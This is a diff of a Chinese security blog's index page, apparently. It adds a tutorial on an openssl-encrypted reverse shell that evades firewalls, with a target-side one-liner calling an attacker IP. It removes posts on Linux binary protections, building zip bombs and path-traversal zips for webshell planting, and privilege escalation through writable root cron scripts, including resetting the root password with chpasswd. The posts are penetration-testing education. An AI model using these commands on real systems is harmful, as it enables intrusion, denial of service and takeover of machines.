+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在渗透测试过程中，经常会遇到目标服务器有防火墙，能够识别进出站的恶意流量并阻止反弹shell执行，遇到这种情况一般我们采用分块传输，编码，畸形报文等各种手段绕过。本篇介绍一种更方便的方式：使用openssl加密传输。</p>
+<h2 id="攻击机操作"><a href="#攻击机操作" class="headerlink" title="攻击机操作"></a>攻击机操作</h2><p>攻击机生成密钥对<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/openssl_shell/shell01.png" alt=""></p>
+<p>其中各参数：</p>
+<p>-new: 表示生成一个新的证书签署要求<br>-x509： 专用于生成CA自签证书<br>-key：指定生成证书用到的私钥文件<br>-out FILNAME：指定生成的证书的保存路径<br>-days：指定证书的有效期限，单位为day，默认是365天<br>-notes： 生成的私钥文件不会被加密</p>
+<p>攻击机监听端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port 4444</span><br></pre></td></tr></table></figure>
+<h2 id="靶机操作"><a href="#靶机操作" class="headerlink" title="靶机操作"></a>靶机操作</h2><p>靶机上反弹加密shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.xx.xx:4444 &gt; /tmp/s; rm /tmp/s</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/openssl_shell/shell02.png" alt=""></p>
+<p>mkfifo /tmp/s;创建一个管道</p>
+<p>/bin/sh -i &lt; /tmp/s 2&gt;&amp;1 打开一个交互式反弹shell，2&gt;&amp;1的意思是把标准错误输出重定向到标准输出，否则输入错误命令回显会显示在靶机中</p>
+<p>openssl s_client -quiet -connect 192.168.xx.xx:4444 &gt; /tmp/s; 解密流量，将攻击端输入的数据解密后反弹回攻击端</p>
+<p>rm /tmp/s 由于已经加载进内存，清除掉/tmp/s文件</p>
+<p>其中openssl各参数：</p>
+<p>-quiet：不打印出session和证书的信息。同时隐式打开-ign_eof<br>-ign_eof：当输入文件到达文件尾的时候并不断开连接<br>-connect host:port： 设置服务器地址和端口号。如果没有设置，则默认为本地主机以及端口号4433  </p>
+<h2 id="shell成功连接"><a href="#shell成功连接" class="headerlink" title="shell成功连接"></a>shell成功连接</h2><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/openssl_shell/shell03.png" alt=""></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/12/正则表达式导致的redos问题/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1483,806 +2240,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/19/linux程序保护机制/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2020/02/19/linux程序保护机制/" itemprop="url">
-                  linux程序保护机制
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-19T22:21:00+08:00">
-                2020-02-19
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/二进制/" itemprop="url" rel="index">
-                    <span itemprop="name">二进制</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2020/02/19/linux程序保护机制/" class="leancloud_visitors" data-flag-title="linux程序保护机制">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>从创建博客到现在也不少时间了，写了不少网络安全的学习笔记，但都集中在web类漏洞中，近日为了扩展自己的知识体系，准备在二进制上下些功夫，从基础开始记录一下二进制漏洞的笔记。所以就先拿linux程序的保护机制来开个头吧。</p>
-<p>linux系统提供了很多安全机制来降低程序受到缓冲区溢出等攻击手法的攻击，而我们需要使用这些攻击手法来进行攻击，所以就要熟悉常见的安全机制，知己知彼，才能成功实施攻击。</p>
-<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p>checksec是一个检查linux程序开启的安全机制的shell脚本，脚本并不大，可以直接从github下载并使用：<br><a href="https://github.com/slimm609/checksec.sh/" target="_blank" rel="noopener">https://github.com/slimm609/checksec.sh/</a></p>
-<p>gdb的peda插件也带有checksec脚本，由于我们之后还要频繁使用gdb的分析二进制程序，所以直接使用gdb-peda中的checksec</p>
-<p>gdb-peda安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">$ echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure></p>
-<p>安装完成后原本的gdb会变成gdb-peda</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/linux_protect/sec01.png" alt=""></p>
-<p>随便使用一个程序尝试一下checksec</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/linux_protect/sec02.png" alt=""></p>
-<h2 id="CANARY"><a href="#CANARY" class="headerlink" title="CANARY"></a>CANARY</h2><p>CANARY是金丝雀的意思，来源于”金丝雀与矿工”的故事，金丝雀曾经经常被用作煤矿开采的预警系统。矿井中的一氧化碳或甲烷等有毒气体会在影响矿工之前杀死这些金丝雀，矿工们会根据金丝雀的状态,判断矿井是否安全。</p>
-<p>和金丝雀的作用类似，在linux程序中，CANARY是一种栈保护机制，栈保护机制开启后，函数执行时会先往栈中插入随机值，这个随机值就被称为CANARY，当函数返回时，会先验证这个随机数是否被更改，如果被更改说明有栈溢出行为，就会使程序强制停止，从而规避栈溢出带来的危害。</p>
-<p>canary所在位置图解：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp =&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 =&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | 局部变量        |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure></p>
-<p>gcc编译时，可通过编译选项选择是否启用canary机制<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-fno-stack-protector 禁用栈保护</span><br><span class="line">-fstack-protector 启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">-fstack-protector-all 启用堆栈保护，为所有函数插入保护代码</span><br></pre></td></tr></table></figure></p>
-<h2 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h2><p>FORTIFY机制用于检查程序是否存在缓冲区溢出错误，适用于memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets等函数。</p>
-<p>在函数编译时，加入FORTIFY机制的代码会在编译过程中自动添加一部分代码，判断数组的大小，削减缓冲区溢出的危害。</p>
-<p>gcc编译时，默认不开启FORTIFY机制，可通过编译选项选择开启的FORTIFY机制强度<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -D_FORTIFY_SOURCE=1 仅仅只会在编译时进行检查</span><br><span class="line">gcc -D_FORTIFY_SOURCE=2</span><br></pre></td></tr></table></figure></p>
-<h2 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h2><p>NX是No-eXecute的缩写，设置NX会限制数据页面内存中不可执行代码，若程序尝试在被限制内存中执行代码，CPU会抛出异常。这种防御手段可以很好的克制ret2shellcode方式的攻击手段。</p>
-<p>gcc默认开启NX机制防止数据内存中执行代码，可以通过编译选项关闭NX机制<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -z execstack 关闭NX保护</span><br><span class="line">gcc -z noexecstack 开启NX保护</span><br></pre></td></tr></table></figure></p>
-<p>在Windows下，类似的概念为DEP（数据执行保护），在最新版的Visual Studio中默认开启了DEP编译选项。</p>
-<h2 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h2><p>PIE叫做代码部分地址无关，PIE能使程序像共享库一样在主存任何位置装载，这需要将程序编译成位置无关，并链接为ELF共享对象。</p>
-<p>PIE和内存地址随机化机制ASLR（address space layout randomization)会同时工作,使代码</p>
-<p>如果不开启PIE的话，那么每次ELF文件加载的地址都是相同的。如果开启PIE，那么每次都会不同。</p>
-<p>liunx下关闭PIE的命令如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure></p>
-<p>gcc中可以通过编译选项选择不同强度的PIE<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test test.c // 默认情况下，不开启PIE</span><br><span class="line">gcc -fpie -pie -o test test.c // 开启PIE，此时强度为1</span><br><span class="line">gcc -fPIE -pie -o test test.c // 开启PIE，此时为最高强度2</span><br><span class="line">gcc -fpic -o test test.c // 开启PIC，此时强度为1，不会开启PIE</span><br><span class="line">gcc -fPIC -o test test.c // 开启PIC，此时为最高强度2，不会开启PIE</span><br></pre></td></tr></table></figure></p>
-<h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><p>RELRO机制全名是read only relocation，指定binary的一块区域使其权限变为只读。<br>在linux程序中，很多攻击都是由于存储数据的区域被写入恶意代码进行的，RELRO机制主要可以缓解对GOT表的攻击(Global Offset Table)</p>
-<p>gcc中可以通过编译选项控制RELRO<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test test.c // 默认情况下，是Partial RELRO</span><br><span class="line">gcc -z norelro -o test test.c // 关闭，即No RELRO</span><br><span class="line">gcc -z lazy -o test test.c // 部分开启，即Partial RELRO</span><br><span class="line">gcc -z now -o test test.c // 全部开启，即</span><br></pre></td></tr></table></figure></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/15/zip炸弹和跨目录zip文件的构造/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2020/02/15/zip炸弹和跨目录zip文件的构造/" itemprop="url">
-                  zip炸弹和跨目录zip文件的构造
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-15T16:45:05+08:00">
-                2020-02-15
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2020/02/15/zip炸弹和跨目录zip文件的构造/" class="leancloud_visitors" data-flag-title="zip炸弹和跨目录zip文件的构造">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在对可上传zip文件的上传点进行测试时，除了一般的上传漏洞，我们也要关注其后台代码对zip文件解压后的大小和跨目录解压问题的检查。博主在本文中将介绍测试上述两种问题所用到的zip文件如何构造。</p>
-<h2 id="什么是zip炸弹"><a href="#什么是zip炸弹" class="headerlink" title="什么是zip炸弹"></a>什么是zip炸弹</h2><p>zip炸弹就是一个高压缩比的zip文件，它本身可能只有几M或几十M的大小，但是解压缩之后会产生巨大的数据量，会解压到几十G的大小甚至更大，这种zip文件会对解压缩的系统造成严重的资源负担，影响目标系统业务甚至达到使系统崩溃的结果。</p>
-<h2 id="可用于攻击何种系统"><a href="#可用于攻击何种系统" class="headerlink" title="可用于攻击何种系统"></a>可用于攻击何种系统</h2><p>zip炸弹的危害主要在于它解压时消耗的资源和解压后占用的资源，所以主要会对未进行压缩文件解压后大小校验就直接解压的系统造成危害。</p>
-<h2 id="如何制作zip炸弹"><a href="#如何制作zip炸弹" class="headerlink" title="如何制作zip炸弹"></a>如何制作zip炸弹</h2><p>制作zip炸弹的方法非常简单，我们可以使用linux自带的命令制作。</p>
-<h3 id="1-制造一个较大的csv数据文件"><a href="#1-制造一个较大的csv数据文件" class="headerlink" title="1.制造一个较大的csv数据文件"></a>1.制造一个较大的csv数据文件</h3><p>如创建一个1G的csv数据文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=/dev/zero count=$((1024*1024)) bs=1024 of=bigFile.csv</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/zip_upload/zip01.png" alt=""></p>
-<p>我们也可以通过更改count的值和bs的值创建更大的csv数据文件<br>如10G的csv数据文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=/dev/zero count=$((1024*1024)) bs=10240 of=bigFile.csv</span><br></pre></td></tr></table></figure></p>
-<h3 id="2-使用zip-9命令压缩"><a href="#2-使用zip-9命令压缩" class="headerlink" title="2.使用zip -9命令压缩"></a>2.使用zip -9命令压缩</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -9 bigFile.zip bigFile.csv</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/zip_upload/zip02.png" alt=""></p>
-<p>可以从图中看到，1G的csv文件被压缩到了1018K，我们将这个不到1M的zip文件上传，一般都能通过网站的上传文件大小限制，对自身上传时资源耗费很低，但是服务器解压过程中和解压之后占用的资源就比较多了。</p>
-<p>本文中用到的只是一个简单的例子，实际进攻时我们使用的zip文件解压后大小会更大，多达几十或上百TB级别，而且压缩比也会更高，压缩文件实际大小可能只有十几MB。会对服务器造成很严重的资源占用。</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/zip_upload/zip03.png" alt=""></p>
-<p>我们使用这些超高压缩比的zip文件时也不需要自己构造，github中可以找到很多已经打包好的zip炸弹。</p>
-<h2 id="什么是zip跨目录"><a href="#什么是zip跨目录" class="headerlink" title="什么是zip跨目录"></a>什么是zip跨目录</h2><p>zip跨目录与我们常见的跨目录问题类似，都是使用../来进行相对路径的目录跨越，zip文件中携带含有../的文件，在解压过程中这些文件名被解析成相对路径，解压后就会将这些文件传递到其他目录。</p>
-<h2 id="可用于攻击何种系统-1"><a href="#可用于攻击何种系统-1" class="headerlink" title="可用于攻击何种系统"></a>可用于攻击何种系统</h2><p>存在对zip文件解压的系统，程序实现代码未对携带的../等进行过滤，且解压时使用的解压程序没有跨目录的保护机制，这些文件才会被跨目录。</p>
-<p>linux中默认的unzip，即使正常使用解压了含有../的zip文件，也是不会被跨目录的，但是加入-:参数就会产生这种问题。所以这类问题大多数出现在程序的实现中，程序中调用了某些方法来进行文件解压，但是没有严格判断造成的。</p>
-<p>zip跨目录最典型的攻击手段用于存在上传后缀限制的web系统中，如某些接口仅允许上传压缩文件，上传后会自动解压，但是上传路径我们无法访问。这时候攻击者就会构造一个webshell文件并添加为携带目录信息的zip文件，被自动解压后就会将webshell解压到可访问目录，就会造成getshell。</p>
-<h2 id="如何制作跨目录zip文件"><a href="#如何制作跨目录zip文件" class="headerlink" title="如何制作跨目录zip文件"></a>如何制作跨目录zip文件</h2><p>制作跨目录zip文件的方式很方便，我们可以先制作好再上传，也可以在上传的过程中使用burpsuite改zip文件信息来构造。需要改的信息都是相同的。</p>
-<h3 id="1-使用notepad-修改"><a href="#1-使用notepad-修改" class="headerlink" title="1.使用notepad++修改"></a>1.使用notepad++修改</h3><p>首先我们需要创建一个文件名较长的文件，如1234567890.txt。</p>
-<p>然后将其压缩为zip格式。</p>
-<p>使用notepad++打开zip格式的文件，寻找两处很明显的1234567890.txt字段，修改成../../7890.txt，保存后重新打开zip文件就成功了。</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/zip_upload/zip04.png" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/zip_upload/zip05.png" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/zip_upload/zip06.png" alt=""></p>
-<p>在修改的过程中要确保修改前的文件名和修改后的文件名长度一致，由于一个../就占了三个长度，所以在前面才需要文件名较长，文件名越长，可以跨越的目录层数越多。</p>
-<h3 id="2-使用burpsuite修改"><a href="#2-使用burpsuite修改" class="headerlink" title="2.使用burpsuite修改"></a>2.使用burpsuite修改</h3><p>上传过程中，使用burpsuite抓包，直接修改和notepad++中要修改的同样的两处字段提交即可。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/12/linux常见提权方式总结/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2020/02/12/linux常见提权方式总结/" itemprop="url">
-                  linux常见提权方式总结
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-12T23:00:00+08:00">
-                2020-02-12
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/提权/" itemprop="url" rel="index">
-                    <span itemprop="name">提权</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2020/02/12/linux常见提权方式总结/" class="leancloud_visitors" data-flag-title="linux常见提权方式总结">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>提权是渗透测试中重要的一步，我们通常使用各种内核漏洞的cve来进行提权，但是在本文中博主想介绍一些，由于人为配置不当造成的提权方法，开阔提权时的思路。</p>
-<h2 id="1-crontab定时任务提权"><a href="#1-crontab定时任务提权" class="headerlink" title="1. crontab定时任务提权"></a>1. crontab定时任务提权</h2><p>crontab是cron table的简写，它是cron的配置文件，而cron是linux内置管理定时任务的进程。</p>
-<p>我们可以通过如下指令来编辑和查看当前工作表命令 </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">crontab [-u username]　　　　//省略用户表表示操作当前用户的crontab</span><br><span class="line">    -e      (编辑工作表)</span><br><span class="line">    -l      (列出工作表里的命令)</span><br><span class="line">    -r      (删除工作表)</span><br></pre></td></tr></table></figure>
-<p>更多的crontab操作可以参考教程 <a href="https://www.runoob.com/w3cnote/linux-crontab-tasks.html" target="_blank" rel="noopener">https://www.runoob.com/w3cnote/linux-crontab-tasks.html</a> </p>
-<h3 id="1-1-root权限定时任务脚本普通用户可写"><a href="#1-1-root权限定时任务脚本普通用户可写" class="headerlink" title="1.1 root权限定时任务脚本普通用户可写"></a>1.1 root权限定时任务脚本普通用户可写</h3><p>以root权限执行的定时任务或其所在文件夹，低权限用户拥有写权限，则可进行提权。</p>
-<p>示例：</p>
-<p>切换到root用户，输入crontab -e，添加一个一分钟执行一次的shell脚本，然后赋予此脚本执行权限和其他用户可写权限。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/1 * * * * /home/test/cron.sh</span><br></pre></td></tr></table></figure>
-<p>开启其他shell，切换到普通用户，修改脚本内容为重置root密码，或者添加此普通用户权限等操作。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;root:password&quot; | chpasswd</span><br></pre></td></tr></table></figure>
-<p>然后su root使用更改后密码切换至root</p>
-<p>如果文件不可写而文件夹可写的情况，如下图情况，可以删除到整个路径，然后重新由普通用户创建路径和其中脚本，就变成可写的情况了。</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/linux_sudo/sudo01.png" alt=""></p>
-<h3 id="1-2-root权限定时任务调用的脚本普通用户可写"><a href="#1-2-root权限定时任务调用的脚本普通用户可写" class="headerlink" title="1.2 root权限定时任务调用的脚本普通用户可写"></a>1.2 root权限定时任务调用的脚本普通用户可写</h3><p>很多时候，定时任务并不是孤立存在的，它会去调用很多别的shell脚本来完成一些操作，而root权限的定时任务调用的脚本也会以root权限执行，所以我们仍需要关注其调用的其他脚本是否普通用户可写，如果可写，仍然可以提权。</p>
-<p>查询此类脚本的方法是首先找到root的定时任务 xxx.sh，然后在文件种查找其他shell脚本即可</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;*.sh&quot; xxx.sh</span><br></pre></td></tr></table></figure>
-<h2 id="2-sudo脚本提权"><a href="#2-sudo脚本提权" class="headerlink" title="2. sudo脚本提权"></a>2. sudo脚本提权</h2><p>sudo脚本提权，主要和/etc/sudoers配置文件有关，主要由以下三种配置引起：</p>
-<ul>
-<li><p>1.在sudoers文件中配置的脚本在运行时默认以root权限执行</p>
-</li>
-<li><p>2.在sudoers文件中配置的文件夹，内部所有脚本默认以root权限执行</p>
-</li>
-<li><p>3.在sudoers文件中配置的系统命令，默认以root权限执行</p>
-</li>
-</ul>
-<p>而这三种配置就引出了三种提权方式，在这里作者分别配置了，/home/test/sudotest.sh文件，/home/test/sudo文件夹，以及zip,tar,more三个命令，分别对应了上述三种情况</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/linux_sudo/sudo02.png" alt=""></p>
-<h3 id="2-1-sudoers文件中配置的脚本文件"><a href="#2-1-sudoers文件中配置的脚本文件" class="headerlink" title="2.1 sudoers文件中配置的脚本文件"></a>2.1 sudoers文件中配置的脚本文件</h3><p>/etc/sudoers中配置的sudo脚本文件低权限用户是否具有写权限，具有写权限，则可进行sudo提权。</p>
